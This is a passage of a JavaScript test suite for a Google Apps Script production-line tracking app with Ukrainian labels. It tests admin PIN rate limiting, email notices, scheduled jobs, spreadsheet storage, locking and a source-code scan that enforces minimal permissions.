    assert.equal(hist.works[0].ts, '2026-09-24T11:30:00.000Z');

    // запис: службові стовпці L2 — у правильних (переставлених) клітинках; чужі дані й формула — на місці
    const cols0 = L.header().slice();
    P.ok(P.call('event', { id: 'h1', ts: P.iso(), line_id: 'L2', state: 'run', operator: 'Іван' }));
    assert.deepEqual(L.header(), cols0, 'стовпці не додано й не переставлено');
    const rec = L.records();
    assert.equal(rec[1].ID, 'L2');
    assert.equal(rec[1]['Поточний стан'], 'Працює');
    assert.equal(rec[1]['ID останньої події'], 'h1');
    assert.equal(rec[1]['Назва'], 'Лінія 2 (з таблиці)');
    assert.equal(rec[1]['Порядок'], 5.5);
    assert.equal(rec[0]['Коментар керівника'], 'перевірити датчик');
    assert.deepEqual(L.formulas(), [{ row: 3, col: note, formula: '=1+1' }]);
    assert.equal(rec[2]['Назва'], 'Лінія без ID');
  });

  test('налаштування, змінені в таблиці: «так»/«ні», 90%, невідомий пояс', () => {
    const P = ready();
    const S = P.sheet('settings');
    const at = (key) => P.rows('settings').findIndex((r) => r['Параметр'] === key) + 2;
    S.type(at('instant_due'), 2, 'ні');
    S.type(at('warn_pct'), 2, '80%');
    S.type(at('digest_hour'), 2, '18');
    S.type(at('tz'), 2, 'Mars/Base');
    const b = P.ok(P.admin('bootstrap'));
    assert.equal(b.settings.instant_due, false);
    assert.equal(b.settings.warn_pct, 80);
    assert.equal(b.settings.digest_hour, 18);
    assert.equal(b.settings.tz, 'Europe/Kyiv', 'невідомий пояс → типовий');
  });
});

/* ================================================================== доступ керівника */

describe('PIN керівника', () => {
  test('адмін-дії без PIN → ADMIN_REQUIRED; обмеження спроб (RATE_LIMIT) по пристрою', () => {
    const P = ready();
    assert.equal(P.call('save', { table: 'lines', row: { name: 'X' } }).error, 'ADMIN_REQUIRED');
    assert.equal(P.call('admin_check').error, 'ADMIN_REQUIRED');
    assert.equal(P.ok(P.admin('admin_check')).ok, true);
    const tryPin = (device, pin, action = 'admin_check') => P.post({ action, token: P.token, device, admin: pin });
    for (let i = 0; i < 10; i++) assert.equal(tryPin('D1', wrongPin(P.pin, i)).error, 'ADMIN_REQUIRED', 'спроба ' + (i + 1));
    const limited = tryPin('D1', P.pin);
    assert.equal(limited.error, 'RATE_LIMIT');
    assert.equal(limited.message, LinesCore.ERR_MSG.RATE_LIMIT);
    assert.equal(tryPin('D1', P.pin, 'save').error, 'RATE_LIMIT');
    const boot = P.ok(tryPin('D1', P.pin, 'bootstrap'));
    assert.equal(boot.admin, false, 'під обмеженням PIN не діє, але планшет працює');
    assert.equal(P.ok(tryPin('D2', P.pin)).ok, true, 'інший пристрій не заблоковано');
    // той самий невірний PIN (старий PIN на планшеті) рахується один раз
    for (let i = 0; i < 25; i++) assert.equal(tryPin('D3', wrongPin(P.pin, 0), 'bootstrap').admin, false);
    assert.equal(P.ok(tryPin('D3', P.pin)).ok, true);
    // через 10 хвилин — знову можна
    P.advance(10 * MIN + 1000);
    assert.equal(P.ok(tryPin('D1', P.pin)).ok, true);
  });

  test('без ADMIN_PIN керівника немає; загальний ліміт на всі пристрої', () => {
    const P = ready();
    P.G.PropertiesService.getScriptProperties().deleteProperty('ADMIN_PIN');
    assert.equal(P.post({ action: 'admin_check', token: P.token, admin: '' }).error, 'ADMIN_REQUIRED');
    assert.equal(P.post({ action: 'admin_check', token: P.token, admin: 'undefined' }).error, 'ADMIN_REQUIRED');
    const Q = ready();
    for (let i = 0; i < 60; i++) Q.post({ action: 'admin_check', token: Q.token, device: 'dev' + i, admin: wrongPin(Q.pin, i) });
    assert.equal(Q.post({ action: 'admin_check', token: Q.token, device: 'new', admin: Q.pin }).error, 'RATE_LIMIT');
  });
});

/* ================================================================== сповіщення */

describe('сповіщення: листи й журнал «Сповіщення»', () => {
  test('зауваження в чек-листі та ремонт → лист керівникам; повтор не надсилає вдруге', () => {
    const P = ready();
    configure(P);
    P.ok(P.admin('settings_save', { values: { manager_emails: 'boss@example.com, chief@example.com' } }));
    const bad = P.ok(P.call('checklist', { id: 'cbad', ts: P.iso(), line_id: 'L1', occasion: 'start', operator: 'Олена',
      answers: [{ item_id: 'I1', value: 'fail', note: 'Кожух тріснув' }, { item_id: 'I2', value: '9' }] }));
    assert.equal(bad.check.result, 'fail');
    assert.ok(!JSON.stringify(bad).includes('_notify'), '_notify не йде клієнту');
    assert.equal(P.I.mails.length, 1);
    const m = P.I.mails[0];
    assert.equal(m.to, 'boss@example.com,chief@example.com');
    assert.match(m.subject, /Зауваження в чек-листі — Лінія фасування №1/);
    assert.match(m.htmlBody, /Кожух тріснув/);
    assert.ok(m.body.length > 20);
    assert.equal(m.name, 'Облік ліній');
    const n = P.rows('notices')[0];
    assert.equal(n['Тип'], 'Зауваження в чек-листі');
    assert.equal(n['Ключ'], 'check:cbad');
    assert.equal(n['Статус'], 'sent');
    assert.equal(n['Кому'], 'boss@example.com, chief@example.com');
    P.ok(P.call('checklist', { id: 'cbad', ts: P.iso(), line_id: 'L1', occasion: 'start', answers: [] }));
    assert.equal(P.I.mails.length, 1, 'дублікат чек-листа — без листа');
    // ремонт у пакеті
    const r = P.ok(P.call('batch', { ops: [{ op_id: 'a', action: 'event', id: 'rep1', ts: P.iso(MIN), line_id: 'L1', state: 'repair', reason: 'Заїдає дозатор' }] }));
    assert.ok(!JSON.stringify(r).includes('_notify'));
    assert.equal(P.I.mails.length, 2);
    assert.match(P.I.mails[1].subject, /Ремонт \/ аварійна зупинка/);
    assert.equal(P.rows('notices')[1]['Ключ'], 'repair:rep1');
    P.ok(P.call('event', { id: 'rep1', ts: P.iso(MIN), line_id: 'L1', state: 'repair' }));
    assert.equal(P.I.mails.length, 2);
    // журнал сповіщень для керівника
    const list = P.ok(P.admin('notices'));
    assert.deepEqual(list.notices.map((x) => x.key).sort(), ['check:cbad', 'repair:rep1']);
  });

  test('ліміт листів, помилка пошти, немає отримувачів → статус error у журналі', () => {
    const P = ready();
    configure(P);
    P.ok(P.admin('settings_save', { values: { manager_emails: 'boss@example.com' } }));
    P.I.mailQuota(0);
    P.ok(P.call('event', { id: 'r1', ts: P.iso(), line_id: 'L1', state: 'repair' }));
    assert.equal(P.I.mails.length, 0);
    let n = P.rows('notices').at(-1);
    assert.equal(n['Статус'], 'error');
    assert.match(n['Помилка'], /ліміт/);
    P.I.mailQuota(10);
    P.I.failNextMail('Mail service down');
    P.ok(P.call('event', { id: 'r2', ts: P.iso(MIN), line_id: 'L1', state: 'repair' }));
    n = P.rows('notices').at(-1);
    assert.equal(n['Ключ'], 'repair:r2');
    assert.match(n['Помилка'], /Mail service down/);
    P.ok(P.admin('settings_save', { values: { manager_emails: '' } }));
    P.ok(P.call('event', { id: 'r3', ts: P.iso(2 * MIN), line_id: 'L1', state: 'repair' }));
    n = P.rows('notices').at(-1);
    assert.equal(n['Ключ'], 'repair:r3');
    assert.equal(n['Статус'], 'error');
    assert.match(n['Помилка'], /Немає отримувачів/);
    assert.equal(P.I.mails.length, 0);
  });
});

/* ================================================================== задачі */

describe('задачі за розкладом', () => {
  function withDue(P, emails = 'boss@example.com') {
    configure(P);
    if (emails !== null) P.ok(P.admin('settings_save', { values: { manager_emails: emails } }));
    P.save('rules', { id: 'R2', line_id: 'L1', title: 'Змащення ланцюга конвеєра', work_type: 'lube', interval_days: 7,
      notify: 'mech@example.com', last_done_date: P.iso(-10 * DAY) });
  }

  test('dailyJob: тихий день і digest_mode, звіт один раз на добу, «План ППР»', () => {
    const P = ready();
    configure(P);
    P.ok(P.admin('settings_save', { values: { manager_emails: 'boss@example.com' } }));
    let r = J(P.G.dailyJob());
    assert.equal(r.ok, true);
    assert.equal(r.has_content, false);
    assert.equal(r.digest, 'none');
    assert.equal(P.I.mails.length, 0, 'if_any + тихий день → без листа');
    assert.ok(r.plan > 0);
    const plan = P.rows('plan');
    assert.equal(plan.length, r.plan);
    assert.equal(plan[0]['Робота'], 'ТО-1 фасувального автомата');
    assert.equal(plan[0]['Лінія'], 'Лінія фасування №1');
    assert.equal(plan[0]['Вид'], 'ТО');
    assert.equal(plan[0]['Статус'], 'У нормі');
    assert.ok(plan[0]['Дата'] instanceof Date);
    assert.equal(P.sheet('plan').formatAt(2, 1), 'dd.MM.yyyy');
    P.ok(P.admin('settings_save', { values: { digest_mode: 'always' } }));
    r = J(P.G.dailyJob());
    assert.equal(r.digest, 'sent');
    assert.equal(P.I.mails.length, 1);
    assert.equal(P.I.mails[0].to, 'boss@example.com');
    assert.equal(P.I.mails[0].subject, 'Облік ліній — звіт за 25.09.2026');
    assert.equal(P.rows('notices').at(-1)['Ключ'], 'digest:2026-09-25');
    r = J(P.G.dailyJob());
    assert.equal(r.digest, 'duplicate');
    assert.equal(P.I.mails.length, 1, 'другий запуск тієї ж доби — без листа');
    assert.equal(P.rows('plan').length, r.plan, 'план перезаписано, не дописано');
  });

  test('dailyJob: є прострочене → звіт у режимі if_any', () => {
    const P = ready();
    withDue(P);
    const r = J(P.G.dailyJob());
    assert.equal(r.has_content, true);
    assert.equal(r.digest, 'sent');
    assert.match(P.I.mails[0].htmlBody, /Потрібно виконати/);
    assert.match(P.I.mails[0].htmlBody, /Змащення ланцюга конвеєра/);
    assert.equal(P.rows('plan')[0]['Статус'], 'Потрібно виконати');
  });

  test('hourlyJob: кожне сповіщення про строк ТО — один раз; отримувачі з регламенту', () => {
    const P = ready();
    withDue(P);
    let r = J(P.G.hourlyJob());
    assert.equal(r.due, 1);
    assert.equal(r.sent, 1);
    assert.equal(P.I.mails.length, 1);
    assert.equal(P.I.mails[0].to, 'boss@example.com,mech@example.com');
    assert.match(P.I.mails[0].subject, /^Настав строк ТО: Змащення ланцюга конвеєра/);
    assert.match(P.rows('notices')[0]['Ключ'], /^due:R2:/);
    assert.equal(P.rows('notices')[0]['Тип'], 'Настав строк ТО');
    r = J(P.G.hourlyJob());
    assert.equal(r.sent, 0);
    P.advance(HOUR);
    r = J(P.G.hourlyJob());
    assert.equal(r.sent, 0);
    assert.equal(P.I.mails.length, 1);
    // робота за регламентом → новий відлік; коли знову настане строк — новий лист
    P.ok(P.call('work', { id: 'wl', ts: P.iso(), line_id: 'L1', rule_id: 'R2' }));
    P.advance(8 * DAY);
    r = J(P.G.hourlyJob());
    assert.equal(r.sent, 1);
    assert.equal(P.I.mails.length, 2);
    // «Перевірити строки ТО зараз» з меню
    const c = J(P.G.checkDueNow());
    assert.match(c.message, /Прострочених робіт: 1/);
  });

  test('hourlyJob без отримувачів: помилка в журналі один раз; тригер звіту — за digest_hour', () => {
    const P = ready();
    configure(P);
    P.save('rules', { id: 'R2', line_id: 'L1', title: 'Змащення', interval_days: 7, last_done_date: P.iso(-10 * DAY) });
    J(P.G.hourlyJob());
    J(P.G.hourlyJob());
    const n = P.rows('notices');
    assert.equal(n.length, 1);
    assert.equal(n[0]['Статус'], 'error');
    // зміна години звіту в застосунку переставляє тригер
    P.ok(P.admin('settings_save', { values: { digest_hour: 18 } }));
    let daily = P.I.triggers().filter((t) => t.handler === 'dailyJob');
    assert.equal(daily.length, 1);
    assert.equal(daily[0].atHour, 18);
    // … і прямо в таблиці — щогодинна задача помітить
    const S = P.sheet('settings'), at = P.rows('settings').findIndex((r) => r['Параметр'] === 'digest_hour') + 2;
    S.type(at, 2, '6');
    J(P.G.hourlyJob());
    daily = P.I.triggers().filter((t) => t.handler === 'dailyJob');
    assert.equal(daily.length, 1);
    assert.equal(daily[0].atHour, 6);
    assert.equal(P.I.triggers().filter((t) => t.handler === 'hourlyJob').length, 1);
  });

  test('seedDemoData: небагато записів у таблицю; відмова, якщо дані вже є', () => {
    const P = ready();
    P.I.resetCalls();
    const r = J(P.G.seedDemoData());
    assert.equal(r.ok, true);
    assert.ok(P.I.calls.setValues <= 20, 'setValues: ' + P.I.calls.setValues);
    for (const t of ['lines', 'units', 'items', 'meters', 'rules', 'staff', 'events', 'checks', 'answers', 'works', 'readings']) {
      assert.equal(P.rows(t).length, r.counts[t], t);
    }
    assert.ok(r.counts.events > 300);
    assert.equal(P.rows('plan').length, r.plan);
    assert.ok(r.plan > 0);
    assert.ok(P.rows('settings').find((x) => x['Параметр'] === 'products')['Значення'].includes('Кетчуп'));
    const b = P.ok(P.call('bootstrap'));
    assert.deepEqual(Object.fromEntries(Object.entries(b.status).map(([k, v]) => [k, v.state])), { L1: 'run', L2: 'off', L3: 'stop' });
    assert.ok(b.due.some((d) => d.status === 'due'));
    const events = P.rows('events').length;
    P.I.resetCalls();
    const again = J(P.G.seedDemoData());
    assert.equal(again.ok, false);
    assert.match(again.message, /уже є дані/);
    assert.equal(P.I.calls.setValues || 0, 0);
    assert.equal(P.rows('events').length, events);
  });

  test('refreshPlan, recomputeAll, sendDigestNow з меню', () => {
    const P = ready({ ui: true });
    configure(P);
    let r = J(P.G.refreshPlan());
    assert.equal(r.ok, true);
    assert.equal(P.rows('plan').length, r.count);
    P.ok(P.call('event', { id: 'e1', ts: P.iso(-3 * HOUR), line_id: 'L1', state: 'run' }));
    // людина зіпсувала службове значення → перерахунок відновлює
    const L = P.sheet('lines');
    L.type(2, L.col('Мотогодини на момент події'), '999');
    r = J(P.G.recomputeAll());
    assert.equal(r.ok, true);
    assert.equal(P.row('lines', 'L1')['Мотогодини на момент події'], 0);
    assert.match(P.I.ui.alerts.at(-1).prompt, /Перераховано/);
    r = J(P.G.sendDigestNow());
    assert.equal(r.ok, false);
    assert.match(r.message, /manager_emails/);
    P.ok(P.admin('settings_save', { values: { manager_emails: 'boss@example.com' } }));
    r = J(P.G.sendDigestNow());
    assert.equal(r.ok, true);
    assert.equal(P.I.mails.length, 1);
    J(P.G.sendDigestNow());
    assert.equal(P.I.mails.length, 2, 'ручний звіт — щоразу');
  });
});

/* ================================================================== SheetStore */

describe('SheetStore', () => {
  function eventRows(n, t0, stepMs) {
    const rows = [];
    for (let i = 0; i < n; i++) {
      rows.push({ id: 'ev' + i, ts: new Date(t0 + i * stepMs), line_id: 'L1', state: 'Працює', cum_h: i, void: false });
    }
    return rows;
  }

  test('since(): >1500 рядків, рядки не за порядком, читання лише хвоста', () => {
    const P = ready();
    const st = P.store();
    const t0 = Date.parse(NOW) - 2100 * HOUR;
    const rows = eventRows(2100, t0, HOUR);
    const bound = new Date(t0 + 1700 * HOUR);
    for (let i = 0; i < 2100; i += 97) rows[i].ts = new Date(rows[i].ts.getTime() - 3 * DAY);   // старіші «із черги»
    rows[1500].ts = new Date(bound.getTime() + 30 * MIN);   // новіший рядок у другій порції знизу
    rows[1999].ts = '';                                     // рядок без часу
    st.insert('events', rows);
    P.sheet('events').type(1800, 2, 'вчора ввечері');       // текст замість часу (рядок 1800 = ev1798)
    const fresh = P.store();
    P.I.resetCalls();
    const got = J(fresh.since('events', bound));
    const cells = P.I.calls.cellsRead;
    const all = J(P.store().all('events'));
    const expect = all.filter((r) => r.ts !== '' && (!/^\d{4}-\d\d-\d\dT/.test(r.ts) || Date.parse(r.ts) >= bound.getTime())).map((r) => r.id);
    assert.ok(expect.length > 390, String(expect.length));
    assert.deepEqual(got.map((r) => r.id), expect, 'усі рядки з ts >= межі (і з текстом у «Час»), у порядку аркуша');
    assert.ok(got.some((r) => r.id === 'ev1500'), 'рядок не за порядком знайдено');
    assert.ok(got.some((r) => r.id === 'ev1798'), 'текстовий час віддано ядру');
    assert.ok(!got.some((r) => r.id === 'ev1999'), 'рядок без часу пропущено');
    const width = SCHEMA.events.cols.length;
    assert.equal(cells, width + 1500 * width, 'заголовок і три порції по 500 рядків, а не весь журнал');
    // межа раніше за все — усі рядки з часом; межа в майбутньому — лише текстовий час (дві порції)
    assert.equal(fresh.since('events', new Date(t0 - 10 * DAY)).length, 2099);
    P.I.resetCalls();
    assert.deepEqual(J(fresh.since('events', new Date(Date.parse(NOW) + DAY))).map((r) => r.id), ['ev1798']);
    assert.equal(P.I.calls.getValues, 2);
    // ядро поверх since: history за 2 доби бачить лише свіжі події
    const h = P.ok(P.call('history', { types: 'events', from: P.iso(-2 * DAY), limit: 5000 }));
    assert.ok(h.events.length > 0 && h.events.every((e) => Date.parse(e.ts) >= Date.parse(P.iso(-2 * DAY))));
  });

  test('update(): далекі рядки — запис без читання; багато близьких — один діапазон; сусіди й формули цілі', () => {
    const P = ready();
    const st = P.store();
    st.insert('events', eventRows(1000, Date.parse(NOW) - 1000 * HOUR, HOUR));
    const E = P.sheet('events');
    E.insertColumnBefore(E.col('Мотогодини лінії'));          // чужий стовпець між службовими
    E.type(1, E.col('Мотогодини лінії') - 1, 'Моя формула');
    const fcol = E.col('Моя формула');
    E.type(501, fcol, '=A501&"!"');                          // рядок ev499
    E.type(502, fcol, '\'007');                              // рядок ev500
    // 1) кілька далеких рядків: стовпець ID + заголовок, далі — лише записи суцільних відрізків
    let fresh = P.store();
    P.I.resetCalls();
    const n = fresh.update('events', [
      { id: 'ev3', flag: 'Запуск без чек-листа' },
      { id: 'ev990', void: true, void_note: 'тест' },
      { id: 'nope', flag: 'x' }
    ]);
    assert.equal(n, 2);
    assert.equal(P.I.calls.getValues, 2, 'заголовок + стовпець ID');
    assert.equal(P.I.calls.setValues, 2, 'по відрізку на рядок');
    // 2) багато близьких рядків → один діапазон: читання значень і формул + один запис
    fresh = P.store();
    const many = [];
    for (let i = 480; i < 520; i++) many.push({ id: 'ev' + i, cum_h: i + 0.5, flag: 'Запуск без чек-листа', prev_state: 'Простій' });
    many.push({ id: 'ev500', note: '=1+1' });
    P.I.resetCalls();
    assert.equal(fresh.update('events', many), 41);
    assert.equal(P.I.calls.setValues, 1);
    assert.equal(P.I.calls.getFormulas, 1);
    assert.equal(P.I.calls.getValues, 3, 'заголовок + стовпець ID + діапазон');
    const rec = E.records();
    assert.equal(rec[3]['Позначка'], 'Запуск без чек-листа');
    assert.equal(rec[4]['Позначка'], '');
    assert.equal(rec[990]['Анульовано'], true);
    assert.equal(rec[990]['Причина анулювання'], 'тест');
    assert.equal(rec[991]['Анульовано'], false);
    assert.equal(rec[499]['Мотогодини лінії'], 499.5);
    assert.equal(rec[499]['Попередній стан'], 'Простій');
    assert.equal(rec[500]['Примітка'], '=1+1', 'формула з даних — текстом');
    assert.equal(rec[500]['Моя формула'], '007', 'текст сусідньої клітинки лишився текстом');
    assert.equal(rec[520]['Мотогодини лінії'], 520, 'рядок поза групою не змінено');
    assert.deepEqual(E.formulas(), [{ row: 501, col: fcol, formula: '=A501&"!"' }], 'формула в чужому стовпці збережена');
    assert.equal(fresh.update('events', []), 0);
  });

  test('чужий порядок стовпців і відсутній стовпець: запис за заголовками, стовпець дописується', () => {
    const P = ready();
    const U = P.sheet('units');
    U.moveColumn(1, U.lastColumn);                          // «ID» — останній
    U.raw(1, U.col('Примітки'), '');                        // стовпець «Примітки» зник
    const st = P.store();
    st.insert('units', [{ id: 'U1', line_id: 'L1', name: 'Дозатор', notes: 'важливо', active: true }]);
    const h = U.header();
    assert.equal(h.at(-1), 'Примітки', 'відсутній стовпець дописано праворуч');
    const r = U.records()[0];
    assert.equal(r.ID, 'U1');
    assert.equal(r['Назва'], 'Дозатор');
    assert.equal(r['Примітки'], 'важливо');
    assert.equal(r['Активний'], true);
    assert.equal(U.validationAt(2, U.col('Активний')).type, 'CHECKBOX');
    assert.deepEqual(J(P.store().all('units')).map((x) => x.id), ['U1']);
  });

  test('ріст аркуша понад 1000 рядків і швидкість на 20 000 рядків', () => {
    const P = ready();
    const st = P.store();
    const t0 = Date.parse(NOW) - 20000 * MIN;
    const started = Date.now();
    for (let k = 0; k < 4; k++) st.insert('events', eventRows(5000, t0 + k * 5000 * MIN, MIN).map((r) => ({ ...r, id: r.id + '_' + k })));
    const E = P.sheet('events');
    assert.equal(E.lastRow, 20001);
    assert.ok(E.maxRows >= 20001);
    const got = P.store().since('events', new Date(Date.parse(NOW) - 60 * MIN));
    assert.equal(got.length, 60);
    const b = P.ok(P.call('bootstrap'));
    assert.equal(b.ok, true);
    assert.ok(Date.now() - started < 8000, 'занадто повільно: ' + (Date.now() - started) + ' мс');
  });

  test('кеш довідників у межах виконання: пакет не перечитує аркуші на кожну операцію', () => {
    const P = ready();
    configure(P);
    const ops = [];
    for (let i = 0; i < 20; i++) ops.push({ op_id: i, action: 'event', id: 'q' + i, ts: P.iso((i - 20) * MIN), line_id: 'L1', state: i % 2 ? 'stop' : 'run' });
    P.I.resetCalls();
    const r = P.ok(P.call('batch', { ops }));
    assert.ok(r.results.every((x) => x.ok));
    // довідники читаються раз на виконання; службові поля — запис без читання; getLastRow — раз на аркуш
    assert.ok((P.I.calls['getValues:Лінії'] || 0) <= 2, 'Лінії: ' + P.I.calls['getValues:Лінії']);
    assert.ok((P.I.calls['getValues:Регламент ТО і ППР'] || 0) <= 2);
    assert.ok(P.I.calls.getValues <= 80, 'getValues: ' + P.I.calls.getValues);
    assert.ok(P.I.calls.getLastRow <= 10, 'getLastRow: ' + P.I.calls.getLastRow);
    assert.equal(P.row('lines', 'L1')['ID останньої події'], 'q19');
    assert.equal(P.row('lines', 'L1')['Поточний стан'], 'Простій');
  });
});

/* ================================================================== блокування */

describe('блокування (LockService)', () => {
  test('інший процес тримає блокування → LOCKED для запису; читання працює', () => {
    const P = ready();
    configure(P);
    P.I.lock.hold();
    const n0 = P.I.lock.attempts.length;
    const r = P.call('event', { id: 'k1', ts: P.iso(), line_id: 'L1', state: 'run' });
    assert.equal(r.ok, false);
    assert.equal(r.error, 'LOCKED');
    assert.equal(r.message, LinesCore.ERR_MSG.LOCKED);
    assert.equal(P.I.lock.attempts.at(-1).timeoutMs, 25000);
    assert.equal(P.call('batch', { ops: [] }).error, 'LOCKED');
    assert.equal(P.admin('settings_save', { values: { company: 'X' } }).error, 'LOCKED');
    const n1 = P.I.lock.attempts.length;
    assert.equal(P.ok(P.call('bootstrap')).ok, true);
    assert.equal(P.ok(P.call('dashboard')).ok, true);
    assert.equal(P.I.lock.attempts.length, n1, 'читання не бере блокування');
    assert.equal(J(P.G.dailyJob()).error, 'LOCKED');
    assert.equal(J(P.G.refreshPlan()).error, 'LOCKED');
    assert.equal(P.rows('events').length, 0);
    P.I.lock.release();
    assert.ok(P.I.lock.attempts.length > n0);
    P.ok(P.call('event', { id: 'k1', ts: P.iso(), line_id: 'L1', state: 'run' }));
    assert.equal(P.rows('events').length, 1);
    assert.equal(P.I.lock.held(), false);
    assert.ok(P.I.calls.flush > 0, 'SpreadsheetApp.flush перед звільненням');
  });

  test('помилка всередині запису звільняє блокування', () => {
    const P = ready();
    configure(P);
    const E = P.sheet('events');
    // збій сховища посеред запису
    P.G.SheetStore.prototype.insert = function () { throw new Error('boom'); };
    const r = P.call('event', { id: 'z1', ts: P.iso(), line_id: 'L1', state: 'run' });
    assert.equal(r.error, 'SERVER_ERROR');
    assert.equal(P.I.lock.held(), false);
    assert.equal(E.lastRow, 1);
  });
});

/* ================================================================== вихідний код */

describe('Server.gs: вихідний код', () => {
  test('верхній рівень — лише var / function (і методи SheetStore); немає openById і неіснуючих сервісів', () => {
    const code = SERVER_SRC.replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:'"\\])\/\/.*$/gm, '$1');
    const top = code.split('\n').filter((l) => /^\S/.test(l) && !/^(var |function |SheetStore\.prototype\.\w+ = function|\}|\s*$)/.test(l));
    assert.deepEqual(top, []);
    // верхній рівень не звертається до LinesCore (порядок файлів Core.gs / Server.gs не важливий)
    assert.ok(!code.split('\n').some((l) => /^var .*LinesCore/.test(l)));
    assert.ok(!/openById|UrlFetchApp|HtmlService|DriveApp|GmailApp|Session\.getActiveUser/.test(code));
    assert.ok(!/\?\.|\?\?/.test(code), 'без optional chaining / nullish');
  });

  test('appsscript.json: пояс, V8, веб-застосунок, мінімальні дозволи', () => {
    const m = JSON.parse(readFileSync(fileURLToPath(new URL('../apps-script/appsscript.json', import.meta.url)), 'utf8'));
    assert.equal(m.timeZone, 'Europe/Kyiv');
    assert.equal(m.runtimeVersion, 'V8');
    assert.equal(m.exceptionLogging, 'STACKDRIVER');
    assert.deepEqual(m.webapp, { executeAs: 'USER_DEPLOYING', access: 'ANYONE_ANONYMOUS' });
    assert.deepEqual(m.oauthScopes.slice().sort(), [
      'https://www.googleapis.com/auth/script.container.ui',
      'https://www.googleapis.com/auth/script.scriptapp',
      'https://www.googleapis.com/auth/script.send_mail',
      'https://www.googleapis.com/auth/spreadsheets.currentonly'
    ]);
  });
});
